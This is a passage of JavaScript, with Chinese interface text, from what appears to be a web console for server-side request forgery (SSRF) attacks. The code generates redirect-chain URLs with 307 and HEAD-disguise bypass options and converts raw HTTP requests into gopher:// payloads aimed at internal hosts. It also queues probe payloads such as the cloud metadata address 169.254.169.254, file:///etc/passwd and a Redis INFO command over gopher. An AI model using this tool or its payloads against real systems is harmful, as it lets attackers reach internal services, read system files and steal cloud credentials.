                handlePocSelectionForEditor(matchedPoc, 'basicReqEditor');
            }
            if (method && method !== 'GET' && target.startsWith('http://')) {
                document.getElementById('basicDualEditor').style.display = 'grid';
            } else if (method && method !== 'GET' && target.startsWith('https://')) {
                document.getElementById('statusCode').value = '307';
                alert(`已自动切换至 307 状态码 (${method} + HTTPS)`);
            }
        });

        document.getElementById('statefulPocSelect').innerHTML = pocOptionsHtml.replace('-- 选择POC或手动输入 --', '-- 手动输入 --');
        document.getElementById('statefulPocSelect').addEventListener('change', function() {
            const opt = this.options[this.selectedIndex];
            if (!opt.value) return;
            document.getElementById('statefulFinalTarget').value = opt.value;
            const matchedPoc = POCS.find(p => p.payload === opt.value);
            if (matchedPoc) {
                handlePocSelectionForEditor(matchedPoc, 'statefulReqEditor');
            }
        });

        function handlePocSelectionForEditor(poc, editorId) {
            const editor = document.getElementById(editorId);
            if (!editor) return;
            const method = poc.method || 'GET';
            editor.querySelector('.req-method').value = method;
            let host = '', path = '/';
            try {
                const url = new URL(poc.payload);
                host = url.host;
                path = url.pathname + url.search;
            } catch(e) {}
            editor.querySelector('.req-host').value = host;
            editor.querySelector('.req-path').value = path;
            const headersContainer = editor.querySelector('.req-headers');
            if (headersContainer) {
                headersContainer.innerHTML = '';
                addHeaderRowWithValues(headersContainer, 'Host', host);
                if (poc.headers && typeof poc.headers === 'object') {
                    for (const [key, value] of Object.entries(poc.headers)) {
                        addHeaderRowWithValues(headersContainer, key, value);
                    }
                }
                if (method === 'POST' || method === 'PUT' || method === 'PATCH') {
                    addHeaderRowWithValues(headersContainer, 'Content-Type', 'application/json');
                }
            }
            const bodyInput = editor.querySelector('.req-body');
            if (bodyInput) {
                bodyInput.value = poc.body || '';
                if (!poc.body && (method === 'POST' || method === 'PUT')) {
                    bodyInput.value = '{"ssrf_probe": "success"}';
                }
            }
            const rawAreaId = editorId === 'basicReqEditor' ? 'basicRawArea' : 'statefulRawArea';
            syncStructuredToRaw(editorId, rawAreaId);
        }

        document.querySelectorAll('.nav-tab[data-tab]').forEach(tab => {
            tab.addEventListener('click', function() {
                document.querySelectorAll('.nav-tab[data-tab]').forEach(t => t.classList.remove('active'));
                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
                this.classList.add('active');
                document.getElementById('tab-' + this.dataset.tab).classList.add('active');
                if (this.dataset.tab === 'stateful') refreshChains();
                if (this.dataset.tab === 'blindbench') loadBlindBench();
            });
        });

        // 日志面板子Tab (请求日志 / 命中时间轴)
        document.querySelectorAll('[data-logtab]').forEach(tab => {
            tab.addEventListener('click', function() {
                document.querySelectorAll('[data-logtab]').forEach(t => t.classList.remove('active'));
                document.querySelectorAll('.logtab-content').forEach(c => c.classList.remove('active'));
                this.classList.add('active');
                document.getElementById('logtab-' + this.dataset.logtab).classList.add('active');
                if (this.dataset.logtab === 'timeline') { loadTimelineChains(); refreshTimeline(); }
            });
        });

        function showResult(url) {
            document.getElementById('payloadUrl').textContent = url;
            document.getElementById('resultBox').classList.add('show');
            autoGeneratePayloadBypass(url);
        }

        function copyPayload() {
            const text = document.getElementById('payloadUrl').textContent;
            doCopy(text, '✅ 已复制!');
        }

        function doCopy(text, successMsg) {
            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(text).then(() => alert(successMsg || '✅ 已复制!')).catch(() => fallbackCopyText(text, successMsg));
            } else { fallbackCopyText(text, successMsg); }
        }

        function fallbackCopyText(text, successMsg) {
            const ta = document.createElement("textarea");
            ta.value = text; ta.style.cssText = "position:fixed;top:0;left:0;opacity:0;";
            document.body.appendChild(ta); ta.focus(); ta.select();
            try { if(document.execCommand('copy')) alert(successMsg||'✅ 已复制!'); else alert('❌ 复制失败'); } catch(e) { alert('❌ 复制失败'); }
            document.body.removeChild(ta);
        }

        function generateBasicPayload() {
            const code = document.getElementById('statusCode').value;
            const target = document.getElementById('targetUrl').value.trim();
            if (!target) return alert('请输入目标URL');
            const mode = document.getElementById('redirectMode').value;
            const hb = document.getElementById('hbBasicCheck').checked ? '1' : '0';
            let url = `${BASE_URL}/r?code=${code}&url=${encodeURIComponent(target)}`;
            if (mode !== '30x') url += `&mode=${mode}`;
            if (hb === '1') {
                const hbStatus = document.getElementById('hbBasicStatus').value;
                const hbCt = document.getElementById('hbBasicContentType').value;
                const hbCl = document.getElementById('hbBasicContentLength').value;
                url += `&hb=1&hb_status=${hbStatus}&hb_ct=${encodeURIComponent(hbCt)}&hb_cl=${hbCl}`;
            }
            showResult(url);
        }

        function safeBase64UrlEncode(obj) {
            const jsonStr = JSON.stringify(obj);
            const utf8Bytes = encodeURIComponent(jsonStr).replace(/%([0-9A-F]{2})/g, function(match, p1) { return String.fromCharCode('0x' + p1); });
            const base64 = btoa(utf8Bytes);
            return base64.replace(/\\+/g, '-').replace(/\\//g, '_').replace(/=+$/, '');
        }

        function addHeaderRow(containerIdOrElement) {
            let container;
            if (typeof containerIdOrElement === 'string') { container = document.getElementById(containerIdOrElement); }
            else if (containerIdOrElement && containerIdOrElement.classList && containerIdOrElement.classList.contains('req-headers')) { container = containerIdOrElement; }
            else if (containerIdOrElement && containerIdOrElement.target) { const step = containerIdOrElement.target.closest('.step-item'); container = step ? step.querySelector('.req-headers') : null; }
            if (!container) return;
            const row = document.createElement('div'); row.className = 'header-row';
            row.innerHTML = `<input type="text" class="header-key" placeholder="Name"><input type="text" class="header-value" placeholder="Value"><button class="btn btn-danger btn-small" onclick="this.parentElement.remove()">✕</button>`;
            container.appendChild(row);
        }

        function addHeaderRowWithValues(container, key, value) {
            const row = document.createElement('div'); row.className = 'header-row';
            row.innerHTML = `<input type="text" class="header-key" value="${escapeHtml(key)}"><input type="text" class="header-value" value="${escapeHtml(value)}"><button class="btn btn-danger btn-small" onclick="this.parentElement.remove()">✕</button>`;
            container.appendChild(row);
        }

        function buildGopherFromEditor(editor) {
            const method = editor.querySelector('.req-method').value;
            const host = editor.querySelector('.req-host').value.trim();
            const path = editor.querySelector('.req-path').value.trim();
            const body = editor.querySelector('.req-body').value;
            if (!host) { alert('❌ 请填写 Host'); return null; }
            let req = `${method} ${path} HTTP/1.1\\r\\n`;
            let hasContentType = false;
            editor.querySelectorAll('.header-row').forEach(row => {
                const key = row.querySelector('.header-key').value.trim();
                const value = row.querySelector('.header-value').value.trim();
                if (key) { req += `${key}: ${value}\\r\\n`; if (key.toLowerCase() === 'content-type') hasContentType = true; }
            });
            if (!hasContentType && body && (method === 'POST' || method === 'PUT' || method === 'PATCH')) req += `Content-Type: application/json\\r\\n`;
            if (body) { req += `Content-Length: ${new Blob([body]).size}\\r\\n\\r\\n`; req += body; } else { req += `\\r\\n`; }
            let gopherPayload = encodeURIComponent(req).replace(/%20/g, ' ');
            let port = '80', hostname = host;
            if (host.includes(':')) { const parts = host.split(':'); hostname = parts[0]; port = parts[1]; }
            return `gopher://${hostname}:${port}/_${gopherPayload}`;
        }

        // ========== Burp-style Raw HTTP Editor Functions ==========
        function syncStructuredToRaw(editorId, rawAreaId) {
            const editor = document.getElementById(editorId);
            const rawArea = document.getElementById(rawAreaId);
            if (!editor || !rawArea) return;

            const method = editor.querySelector('.req-method').value;
            const host = editor.querySelector('.req-host').value.trim();
            const path = editor.querySelector('.req-path').value.trim() || '/';
            const body = editor.querySelector('.req-body').value;

            let rawText = `${method} ${path} HTTP/1.1\\n`;
            let hasHost = false;
            editor.querySelectorAll('.header-row').forEach(row => {
                const key = row.querySelector('.header-key').value.trim();
                const value = row.querySelector('.header-value').value.trim();
                if (key) {
                    rawText += `${key}: ${value}\\n`;
                    if (key.toLowerCase() === 'host') hasHost = true;
                }
            });
            if (!hasHost && host) rawText += `Host: ${host}\\n`;
            if (body) {
                rawText += `Content-Length: ${new Blob([body]).size}\\n`;
                rawText += `\\n${body}`;
            } else {
                rawText += `\\n`;
            }
            rawArea.value = rawText;
        }

        function parseRawToStructured(rawAreaId, editorId) {
            const rawArea = document.getElementById(rawAreaId);
            const editor = document.getElementById(editorId);
            if (!rawArea || !editor) return;

            // 先统一 CRLF -> LF, 兼容从各类工具复制的原始请求
            const rawText = rawArea.value.replace(/\\r\\n/g, '\\n').trim();
            if (!rawText) { alert('❌ Raw请求内容为空'); return; }

            const parts = rawText.split(/\\n\\n/);
            const headerSection = parts[0];
            const bodySection = parts.slice(1).join('\\n\\n');

            const lines = headerSection.split('\\n');
            if (lines.length === 0) { alert('❌ 无法解析请求行'); return; }

            const requestLine = lines[0].trim();
            const reqMatch = requestLine.match(/^(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS|TRACE|CONNECT)\\s+(.+?)\\s+(HTTP\\/[\\d.]+)?$/i);
            if (!reqMatch) { alert('❌ 无法解析请求行: ' + requestLine); return; }

            const method = reqMatch[1].toUpperCase();
            const path = reqMatch[2];

            const headers = [];
            let host = '';
            for (let i = 1; i < lines.length; i++) {
                const line = lines[i].trim();
                if (!line) continue;
                const colonIdx = line.indexOf(':');
                if (colonIdx > 0) {
                    const key = line.substring(0, colonIdx).trim();
                    const value = line.substring(colonIdx + 1).trim();
                    headers.push({ key, value });
                    if (key.toLowerCase() === 'host') host = value;
                }
            }

            editor.querySelector('.req-method').value = method;
            editor.querySelector('.req-host').value = host;
            editor.querySelector('.req-path').value = path;

            const headersContainer = editor.querySelector('.req-headers');
            headersContainer.innerHTML = '';
            headers.forEach(h => {
                if (h.key.toLowerCase() !== 'content-length') {
                    addHeaderRowWithValues(headersContainer, h.key, h.value);
                }
            });

            editor.querySelector('.req-body').value = bodySection;
            alert('✅ 已解析到结构化编辑器');
        }

        function rawToGopher(rawAreaId, targetInputId) {
            const rawArea = document.getElementById(rawAreaId);
            const targetInput = document.getElementById(targetInputId);
            if (!rawArea) return;

            const rawText = rawArea.value.trim();
            if (!rawText) { alert('❌ Raw请求内容为空'); return; }

            const lines = rawText.split('\\n');
            let host = '';
            for (const line of lines) {
                const match = line.match(/^Host:\\s*(.+)$/i);
                if (match) { host = match[1].trim(); break; }
            }
            if (!host) { alert('❌ 请在请求中包含Host头'); return; }

            let rawRequest = rawText.replace(/\\r?\\n/g, '\\r\\n');
            if (!rawRequest.endsWith('\\r\\n')) rawRequest += '\\r\\n';

            const bodyIdx = rawRequest.indexOf('\\r\\n\\r\\n');
            if (bodyIdx !== -1) {
                const body = rawRequest.substring(bodyIdx + 4);
                const headerPart = rawRequest.substring(0, bodyIdx);
                const clRegex = /Content-Length:\\s*\\d+/i;
                let newHeader;
                if (clRegex.test(headerPart)) {
                    newHeader = headerPart.replace(clRegex, `Content-Length: ${new Blob([body]).size}`);
                } else if (body.length > 0) {
                    newHeader = headerPart + `\\r\\nContent-Length: ${new Blob([body]).size}`;
                } else {
                    newHeader = headerPart;
                }
                rawRequest = newHeader + '\\r\\n\\r\\n' + body;
            }

            let gopherPayload = encodeURIComponent(rawRequest).replace(/%20/g, ' ');
            let port = '80', hostname = host;
            if (host.includes(':')) { const parts = host.split(':'); hostname = parts[0]; port = parts[1]; }
            const gopherUrl = `gopher://${hostname}:${port}/_${gopherPayload}`;

            if (targetInput) { targetInput.value = gopherUrl; }
            alert('✅ Gopher Payload 已生成');
        }

        function beautifyRawBody(rawAreaId) {
            const rawArea = document.getElementById(rawAreaId);
            if (!rawArea) return;
            const rawText = rawArea.value;
            const parts = rawText.split(/\\n\\n/);
            if (parts.length < 2) { alert('未找到请求体'); return; }
            const headerPart = parts[0];
            const bodyPart = parts.slice(1).join('\\n\\n');
            try {
                const parsed = JSON.parse(bodyPart);
                const formatted = JSON.stringify(parsed, null, 2);
                rawArea.value = headerPart + '\\n\\n' + formatted;
            } catch(e) { alert('请求体不是有效的JSON格式'); }
        }

        function copyRawEditorContent(rawAreaId) {
            const rawArea = document.getElementById(rawAreaId);
            if (!rawArea) return;
            doCopy(rawArea.value, '✅ Raw请求已复制!');
        }

        function applyBasicCustomRequest() {
            const editor = document.getElementById('basicReqEditor');
            const gopherUrl = buildGopherFromEditor(editor);
            if (gopherUrl) { document.getElementById('targetUrl').value = gopherUrl; document.getElementById('basicDualEditor').style.display = 'none'; alert('✅ Gopher Payload 已生成'); }
        }

        function applyStatefulCustomRequest() {
            const editor = document.getElementById('statefulReqEditor');
            const gopherUrl = buildGopherFromEditor(editor);
            if (gopherUrl) { document.getElementById('statefulFinalTarget').value = gopherUrl; document.getElementById('statefulDualEditor').style.display = 'none'; alert('✅ Gopher Payload 已生成'); }
        }

        function toggleBasicEditor() { const e = document.getElementById('basicDualEditor'); e.style.display = e.style.display === 'none' ? 'grid' : 'none'; }
        function toggleStatefulEditor() { const e = document.getElementById('statefulDualEditor'); e.style.display = e.style.display === 'none' ? 'grid' : 'none'; }

        function autoFillEditor(step, pocData = null) {
            const urlInput = step.querySelector('.s-url');
            const hostInput = step.querySelector('.req-host');
            const pathInput = step.querySelector('.req-path');
            const headersContainer = step.querySelector('.req-headers');
            const bodyInput = step.querySelector('.req-body');
            const methodVal = pocData?.method || 'GET';
            let host = '', path = '/';
            try { const url = new URL(urlInput.value.trim()); host = url.host; path = url.pathname + url.search; } catch(e) {}
            if (hostInput) hostInput.value = host;
            if (pathInput) pathInput.value = path;
            if (headersContainer) {
                headersContainer.innerHTML = '';
                addHeaderRowWithValues(headersContainer, 'Host', host);
                if (pocData && pocData.headers) { for (const [key, value] of Object.entries(pocData.headers)) addHeaderRowWithValues(headersContainer, key, value); }
                if (methodVal === 'POST' || methodVal === 'PUT' || methodVal === 'PATCH') addHeaderRowWithValues(headersContainer, 'Content-Type', 'application/json');
            }
            if (bodyInput) { bodyInput.value = pocData?.body || ''; if (!bodyInput.value && (methodVal === 'POST' || methodVal === 'PUT')) bodyInput.value = '{"ssrf_probe": "success"}'; }
        }

        function applyMethodWrap(select) {
            const method = select.value;
            if (method === 'AUTO') return;
            const step = select.closest('.step-item');
            const urlInput = step.querySelector('.s-url');
            let urlStr = urlInput.value.trim();
            if (!urlStr) { alert('请先输入目标URL'); select.value = 'AUTO'; return; }
            if (urlStr.startsWith('http://')) { step.querySelector('.req-editor').style.display = 'block'; autoFillEditor(step); select.value = method; }
            else if (urlStr.startsWith('https://')) { alert('Gopher不支持HTTPS，请用307'); select.value = 'AUTO'; }
            else { alert('仅支持http://协议转Gopher'); select.value = 'AUTO'; }
        }

        function handlePocSelect(selectElement) {
            const option = selectElement.options[selectElement.selectedIndex];
            const step = selectElement.closest('.step-item');
            const urlInput = step.querySelector('.s-url');
            const codeSelect = step.querySelector('.s-code');
            urlInput.value = option.value;
            const pocData = POCS.find(p => p.payload === option.value);
            if (pocData && pocData.method !== 'GET') {
                if (option.value.startsWith('http://')) { step.querySelector('.req-editor').style.display = 'block'; autoFillEditor(step, pocData); step.querySelector('.s-method').value = pocData.method; }
                else if (option.value.startsWith('https://')) { codeSelect.value = '307'; }
            }
        }

        function toggleRequestEditor(btn) {
            const step = btn.closest('.step-item');
            const editor = step.querySelector('.req-editor');
            if (editor.style.display === 'none') { editor.style.display = 'block'; autoFillEditor(step); } else { editor.style.display = 'none'; }
        }

        function applyCustomRequest(btn) {
            const step = btn.closest('.step-item');
            const urlInput = step.querySelector('.s-url');
            const editor = step.querySelector('.req-editor');
            const gopherUrl = buildGopherFromEditor(editor);
            if (gopherUrl) { urlInput.value = gopherUrl; step.querySelector('.s-method').value = 'AUTO'; editor.style.display = 'none'; alert('✅ Gopher已生成'); }
        }

        function addStatelessStep(isFinal = false) {
            stepCount++;
            const borderColor = isFinal ? 'var(--accent-green)' : 'var(--accent)';
            const title = isFinal ? `终点 ${stepCount}` : `中转 ${stepCount}`;
            const defaultCode = isFinal ? '307' : '302';
            const html = `
                <div class="step-item stateless-step" style="border-left-color: ${borderColor};">
                    <div class="step-header">
                        <span class="step-title" style="color: ${borderColor};">${title}</span>
                        <button class="btn btn-danger" onclick="this.closest('.step-item').remove()">✖</button>
                    </div>
                    <div class="step-form">
                        <select class="s-code" style="margin-bottom:10px;">${getStatusCodeOptions(defaultCode)}</select>
                        <div class="step-input-group">
                            <select class="s-method" onchange="applyMethodWrap(this)" style="width:18%;background:rgba(63,185,80,0.08);color:var(--accent-green);border:1px solid rgba(63,185,80,0.25);font-size:13px;padding:12px 10px;">
                                <option value="AUTO">原样</option><option value="POST">→POST</option><option value="PUT">→PUT</option><option value="DELETE">→DEL</option>
                            </select>
                            <select class="s-poc" onchange="handlePocSelect(this)" style="width:30%;padding:12px 10px;font-size:13px;">${pocOptionsHtml}</select>
                            <input type="text" class="s-url" placeholder="目标URL" style="width:52%;font-family:'JetBrains Mono',monospace;font-size:13px;">
                        </div>
                        <button class="btn btn-warning btn-small" onclick="toggleRequestEditor(this)">✏️ 高级编辑</button>
                        <div class="req-editor" style="display:none;">
                            <label>方法</label><select class="req-method"><option value="GET">GET</option><option value="POST" selected>POST</option><option value="PUT">PUT</option><option value="DELETE">DELETE</option></select>
                            <label>Host</label><input type="text" class="req-host" placeholder="host:port">
                            <label>路径</label><input type="text" class="req-path" placeholder="/path">
                            <label>请求头</label><div class="req-headers"></div>
                            <button class="btn btn-ghost btn-small" onclick="addHeaderRow(this)" style="margin-bottom:10px;">+ 请求头</button>
                            <label>请求体</label><textarea class="req-body"></textarea>
                            <button class="btn btn-small" style="margin-top:8px;" onclick="applyCustomRequest(this)">✅ 生成Gopher</button>
                        </div>
                    </div>
                </div>`;
            document.getElementById('statelessStepsContainer').insertAdjacentHTML('beforeend', html);
        }

        function quickSetup() { document.getElementById('statelessStepsContainer').innerHTML = ''; stepCount = 0; addStatelessStep(false); addStatelessStep(true); document.querySelector('.stateless-step .s-url').value = BASE_URL; }
        quickSetup();

        function generateStatelessChain() {
            const steps = document.querySelectorAll('.stateless-step');
            if (steps.length === 0) return alert('请至少添加一个节点');
            let chainData = { s: [] }; let err = false;
            // HEAD bypass for stateless chain
            const hb = document.getElementById('hbStatelessCheck').checked;
            if (hb) chainData.hb = 1;
            // 末跳降级方式
            const fm = document.getElementById('statelessFinalMode').value;
            if (fm && fm !== '30x') chainData.m = fm;

            steps.forEach((step, index) => {
                const c = parseInt(step.querySelector('.s-code').value);
                const urlInput = step.querySelector('.s-url');
                let t = urlInput.value.trim();
                if(!t && index < steps.length - 1) t = BASE_URL;
                if(!t){ err = true; urlInput.style.borderColor = 'var(--accent-red)'; } else { urlInput.style.borderColor = ''; chainData.s.push({c, t}); }
            });
            if(err) return alert('请完善目标URL');
            showResult(`${BASE_URL}/c?b=${safeBase64UrlEncode(chainData)}`);
        }

        function addStatefulStep(isFinal = false) {
            statefulStepCount++;
            const borderColor = isFinal ? 'var(--accent-green)' : 'var(--accent)';
            const title = isFinal ? `终点 ${statefulStepCount}` : `中转 ${statefulStepCount}`;
            const defaultCode = isFinal ? '307' : '302';
            const html = `
                <div class="step-item stateful-step" data-isfinal="${isFinal}" style="border-left-color: ${borderColor};">
                    <div class="step-header">
                        <span class="step-title" style="color: ${borderColor};">${title}</span>
                        <button class="btn btn-danger" onclick="this.closest('.step-item').remove(); syncFinalTargetVisibility();">✖</button>
                    </div>
                    <div class="step-form">
                        <input type="text" class="s-path" placeholder="/ (可用 / /index.html /api/login 等逼真路径)" style="margin-bottom:8px;">
                        <select class="s-code">${getStatusCodeOptions(defaultCode)}</select>
                    </div>
                </div>`;
            document.getElementById('statefulStepsContainer').insertAdjacentHTML('beforeend', html);
            syncFinalTargetVisibility();
        }

        function syncFinalTargetVisibility() {
            const finalSteps = document.querySelectorAll('.stateful-step[data-isfinal="true"]');
            document.getElementById('finalTargetGroup').hidden = finalSteps.length === 0;
        }

        async function generateStatefulChain() {
            const steps = document.querySelectorAll('.stateful-step');
            if (steps.length === 0) return alert('请至少添加一个节点');
            const finalTarget = document.getElementById('statefulFinalTarget').value.trim();
            const hasFinal = [...steps].some(s => s.dataset.isfinal === 'true');
            if (hasFinal && !finalTarget) return alert('请填写最终目标URL');
            const payload = { steps: [], final_target: hasFinal ? finalTarget : null, base_url: BASE_URL };

            // HEAD bypass
            const hb = document.getElementById('hbStatefulCheck').checked;
            if (hb) payload.head_bypass = true;
            // 末跳降级方式
            const fm = document.getElementById('statefulFinalMode').value;
            if (fm && fm !== '30x') payload.final_mode = fm;

            let err = false;
            steps.forEach(step => {
                const path = step.querySelector('.s-path').value.trim();
                const code = parseInt(step.querySelector('.s-code').value);
                if (!path || !path.startsWith('/')) { step.querySelector('.s-path').style.borderColor = 'var(--accent-red)'; err = true; }
                else { step.querySelector('.s-path').style.borderColor = ''; payload.steps.push({ path, code }); }
            });
            if (err) return alert('路径必须以 / 开头');
            try {
                const res = await fetch(CONSOLE_PREFIX + '/api/create_stateful_chain', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
                const data = await res.json();
                if (data.error) alert('❌ ' + data.error); else { showResult(data.first_url); refreshChains(); }
            } catch(e) { alert('❌ 网络错误'); }
        }

        // ========== Queue Presets ==========
        function buildPresetButtons(chainId) {
            const presetKeys = Object.keys(QUEUE_PRESETS);
            return presetKeys.map(key => {
                const preset = QUEUE_PRESETS[key];
                return `<button class="preset-btn" data-preset="${key}" data-chain="${chainId}" onclick="applyPreset('${key}','${chainId}')" title="${preset.description}">${preset.name} (${preset.payloads.length})</button>`;
            }).join('');
        }

        function applyPreset(presetKey, chainId) {
            const preset = QUEUE_PRESETS[presetKey];
            if (!preset) return;
            const textarea = document.getElementById(`queue-input-${chainId}`);
            if (!textarea) return;

            const current = textarea.value.trim();
            if (current) {
                const choice = confirm(`当前队列已有内容。\\n\\n[确定] = 追加 (${preset.payloads.length}条)\\n[取消] = 替换`);
                if (choice) {
                    textarea.value = current + '\\n' + preset.payloads.join('\\n');
                } else {
                    textarea.value = preset.payloads.join('\\n');
                }
            } else {
                textarea.value = preset.payloads.join('\\n');
            }

            const btns = document.querySelectorAll(`button[data-chain="${chainId}"].preset-btn`);
            btns.forEach(b => b.classList.remove('active'));
            const activeBtn = document.querySelector(`button[data-preset="${presetKey}"][data-chain="${chainId}"]`);
            if (activeBtn) activeBtn.classList.add('active');

            const descEl = document.getElementById(`preset-desc-${chainId}`);
            if (descEl) {
                descEl.textContent = `✅ ${preset.name}: ${preset.description} (${preset.payloads.length}条已填充)`;
                descEl.classList.add('show');
            }
        }

        // ========== 有状态链管理 ==========
        async function refreshChains() {
            try {
                const res = await fetch(CONSOLE_PREFIX + '/api/stateful_chains');
                const data = await res.json();
                const container = document.getElementById('chainListContainer');
                const chains = data.chains || [];
                document.getElementById('chainCount').textContent = chains.length;
                if (chains.length === 0) { container.innerHTML = '<div class="no-chains-msg">暂无有状态链</div>'; return; }

                container.innerHTML = chains.map(chain => {
                    const stepsHtml = chain.steps.map((s, i) => `<span class="step-path">${escapeHtml(s.path)}</span><span style="color:var(--text-muted);">(${s.code}${i===chain.steps.length-1?' → 终点':''})</span>`).join(' → ');
                    const lastStep = chain.steps[chain.steps.length - 1];
                    const lastTarget = lastStep ? lastStep.target : '';
                    const firstUrl = `${BASE_URL}${chain.steps[0].path}`;

                    const queue = chain.targets_queue || [];
                    const queueIndex = chain.queue_index || 0;
                    const queueMode = chain.queue_mode || 'sequential';
                    const hasQueue = queue.length > 0;
                    const headBypass = chain.head_bypass || false;
                    const finalMode = chain.final_mode || '30x';

                    let headBypassBadge = headBypass ? '<span class="head-bypass-badge">🔀 HEAD伪装</span>' : '';
                    let fmBadge = (finalMode !== '30x') ? `<span class="fallback-badge">⤵ 末跳 ${escapeHtml(finalMode)}</span>` : '';

                    let queueHtml = '';
                    if (hasQueue) {
                        queueHtml = `
                            <div class="queue-status">
                                <span class="queue-badge queue-badge-active">● 队列模式</span>
                                <span class="queue-badge queue-badge-count">共 ${queue.length} 条</span>
                                <span>当前索引: ${queueIndex} / ${queue.length}</span>
                                <span style="color:var(--text-muted);">模式: ${queueMode === 'sequential' ? '顺序' : '循环'}</span>
                            </div>
                            <div style="margin-top:8px;font-size:13px;color:var(--text-muted);">
                                当前将响应: <span style="color:var(--accent-yellow);">${escapeHtml(queue[queueIndex % queue.length] || '(已耗尽)')}</span>
                            </div>`;
                    }

                    return `
                    <div class="chain-item" id="chain-${chain.id}">
                        <div class="chain-item-header">
                            <span class="chain-item-id">🔗 ${chain.id} ${headBypassBadge}${fmBadge}</span>
                            <span class="chain-item-time">${chain.created_at}</span>
                        </div>
                        <div class="chain-item-steps">${stepsHtml}</div>
                        <div style="font-size:13px;color:var(--text-muted);margin-bottom:6px;">入口: <span style="color:var(--accent-yellow);">${escapeHtml(firstUrl)}</span></div>
                        <div style="font-size:13px;color:var(--text-muted);margin-bottom:6px;">末跳:</div>
                        <div class="chain-item-final">${escapeHtml(lastTarget)}</div>
                        ${queueHtml}
                        <div class="chain-item-actions" style="margin-top:12px;">
                            <input type="text" class="chain-edit-input" id="chain-edit-${chain.id}" value="${escapeHtml(lastTarget)}" placeholder="修改末跳URL">
                            <button class="chain-edit-btn chain-save-btn" onclick="updateChainLastTarget('${chain.id}')">💾 保存</button>
                            <button class="chain-edit-btn chain-copy-btn" onclick="doCopy('${escapeHtml(firstUrl)}', '✅ 已复制!')">📋 首跳</button>
                            <button class="chain-edit-btn" style="background:var(--accent-cyan);color:#0d1117;" onclick="toggleChainHeadBypass('${chain.id}', ${!headBypass})">${headBypass ? '🚫 关闭HEAD伪装' : '🔀 开启HEAD伪装'}</button>
                            <button class="chain-edit-btn chain-delete-btn" onclick="deleteChain('${chain.id}')">🗑 删除</button>
                        </div>
                        <!-- 批量队列区 -->
                        <div class="queue-section">
                            <h4>📦 批量队列投递 (每次请求按顺序响应不同POC)</h4>

                            <div class="queue-presets-section">
                                <div class="preset-title">⚡ 快捷预填充模块 (点击自动填充对应探测Payload)</div>
                                <div class="preset-btns">
                                    ${buildPresetButtons(chain.id)}
                                </div>
                                <div class="preset-desc" id="preset-desc-${chain.id}"></div>
                            </div>

                            <div class="queue-mode-label">
                                <span>模式:</span>
                                <select id="queue-mode-${chain.id}" style="width:auto;padding:6px 10px;font-size:13px;">
                                    <option value="sequential" ${queueMode==='sequential'?'selected':''}>顺序 (用完停止)</option>
                                    <option value="loop" ${queueMode==='loop'?'selected':''}>循环 (无限轮转)</option>
                                </select>
                            </div>
                            <textarea class="queue-textarea" id="queue-input-${chain.id}" placeholder="每行一个目标URL，支持任意协议&#10;例如:&#10;http://169.254.169.254/latest/meta-data/&#10;file:///etc/passwd&#10;gopher://127.0.0.1:6379/_INFO">${queue.join('\\n')}</textarea>
                            <div style="display:flex;gap:8px;flex-wrap:wrap;">
                                <button class="chain-edit-btn chain-save-btn" onclick="saveQueue('${chain.id}')">💾 保存队列</button>
                                <button class="chain-edit-btn" style="background:var(--accent-yellow);color:#0d1117;" onclick="resetQueueIndex('${chain.id}')">🔄 重置索引</button>
                                <button class="chain-edit-btn" style="background:var(--accent-red);color:#fff;" onclick="clearQueue('${chain.id}')">🗑 清空队列</button>
                            </div>
                        </div>
                    </div>`;
                }).join('');
            } catch(e) { console.error('刷新失败:', e); }
        }

        async function toggleChainHeadBypass(chainId, enable) {
            try {
                const res = await fetch(`${CONSOLE_PREFIX}/api/stateful_chains/${chainId}/head_bypass`, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ enabled: enable }) });
                const data = await res.json();
                if (data.error) alert('❌ ' + data.error); else { alert(enable ? '✅ HEAD伪装已开启' : '✅ HEAD伪装已关闭'); refreshChains(); }
            } catch(e) { alert('❌ 网络错误'); }
        }

        async function updateChainLastTarget(chainId) {
            const input = document.getElementById(`chain-edit-${chainId}`);
            const newTarget = input.value.trim();
            if (!newTarget) return alert('URL不能为空');
            try {
                const res = await fetch(`${CONSOLE_PREFIX}/api/stateful_chains/${chainId}/last_target`, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ target: newTarget }) });
                const data = await res.json();
                if (data.error) alert('❌ ' + data.error); else { alert('✅ 已更新'); refreshChains(); }
            } catch(e) { alert('❌ 网络错误'); }
        }

        async function deleteChain(chainId) {
            if (!confirm('确定删除此链？')) return;
            try {
                const res = await fetch(`${CONSOLE_PREFIX}/api/stateful_chains/${chainId}`, { method: 'DELETE' });
                const data = await res.json();
                if (data.error) alert('❌ ' + data.error); else { alert('✅ 已删除'); refreshChains(); }
            } catch(e) { alert('❌ 网络错误'); }
        }

        async function saveQueue(chainId) {
            const textarea = document.getElementById(`queue-input-${chainId}`);
            const modeSelect = document.getElementById(`queue-mode-${chainId}`);
            const lines = textarea.value.split('\\n').map(l => l.trim()).filter(l => l.length > 0);
            const mode = modeSelect.value;
            try {
                const res = await fetch(`${CONSOLE_PREFIX}/api/stateful_chains/${chainId}/queue`, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ targets: lines, mode: mode }) });
                const data = await res.json();
                if (data.error) alert('❌ ' + data.error); else { alert(`✅ 队列已保存 (${lines.length} 条)`); refreshChains(); }
            } catch(e) { alert('❌ 网络错误'); }
        }

        async function resetQueueIndex(chainId) {
            try {
                const res = await fetch(`${CONSOLE_PREFIX}/api/stateful_chains/${chainId}/queue/reset`, { method: 'POST' });
                const data = await res.json();
                if (data.error) alert('❌ ' + data.error); else { alert('✅ 索引已重置为0'); refreshChains(); }
            } catch(e) { alert('❌ 网络错误'); }
        }

        async function clearQueue(chainId) {
            if (!confirm('确定清空队列？将恢复为单一目标模式。')) return;
            try {
                const res = await fetch(`${CONSOLE_PREFIX}/api/stateful_chains/${chainId}/queue`, { method: 'DELETE' });
                const data = await res.json();
                if (data.error) alert('❌ ' + data.error); else { alert('✅ 队列已清空'); refreshChains(); }
            } catch(e) { alert('❌ 网络错误'); }
        }

        // ========== 命中时间轴 + 端口开放推断 ==========
        async function loadTimelineChains() {
            try {
                const res = await fetch(CONSOLE_PREFIX + '/api/stateful_chains');
                const data = await res.json();
